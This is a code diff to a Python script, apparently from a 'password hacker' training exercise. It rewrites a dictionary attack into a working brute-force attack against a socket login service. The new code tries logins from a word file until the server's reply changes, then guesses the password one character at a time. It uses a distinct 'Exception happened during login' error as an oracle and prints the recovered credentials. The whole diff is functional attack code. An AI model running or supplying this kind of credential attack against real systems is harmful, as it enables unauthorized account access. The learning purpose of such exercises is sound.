@@ -68,24 +68,50 @@ Example 2:
 """
 
 
+import json
 import itertools
 import socket
 import sys
 
-
-with open(r'.\hacking\logins.txt', 'r') as login_file:
-    login_list = login_file.read().split()
+letters = ['a', 'b', 'c', 'd', 'e', 'f', 'g',
+           'h', 'i', 'j', 'k', 'l', 'm', 'n',
+           'o', 'p', 'q', 'r', 's', 't', 'u',
+           'v', 'w', 'x', 'y', 'z',
+           '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
+           'A', 'B', 'C', 'D', 'E', 'F', 'G',
+           'H', 'I', 'J', 'K', 'L', 'M', 'N',
+           'O', 'P', 'Q', 'R', 'S', 'T', 'U',
+           'V', 'W', 'X', 'Y', 'Z']
 
 host_name, port = sys.argv[1:]
 with socket.socket() as client_socket:
     client_socket.connect((host_name, int(port)))
-    for password in password_list:
-        password_iter = itertools.product(*list(zip(password.lower(), password.upper())))
-        for passwords in password_iter:
-            client_socket.send(''.join(passwords).encode())
+
+    wrong_login = json.dumps({"result": "Wrong login!"}, indent=4)
+    wrong_password = json.dumps({"result": "Wrong password!"}, indent=4)
+    exception_happened = json.dumps({"result": "Exception happened during login"})
+    connection_success = json.dumps({"result": "Connection success!"})
+    login = ''
+    password = ''
+
+    for word in open(r'.\hacking\passwords.txt', 'r'):
+        json_send = json.dumps({"login": word.rstrip(), "password": password}, indent=4)
+
+        client_socket.send(json_send.encode())
+        response = client_socket.recv(1024).decode()
+        if not response == wrong_login:
+            login = word.rstrip()
+            break
+    c = 260
+    while c:
+        c -= 1
+        for l in letters:
+            json_send = json.dumps({"login": login, "password": password + l}, indent=4)
+
+            client_socket.send(json_send.encode())
             response = client_socket.recv(1024).decode()
-            if response == 'Connection success!':
-                print(''.join(passwords))
+            if response == exception_happened:
+                password += l
+            elif response == connection_success:
+                print(json.dumps({"login": login, "password": password}))
                 exit()
-    else:
-        print('Wrong password!')
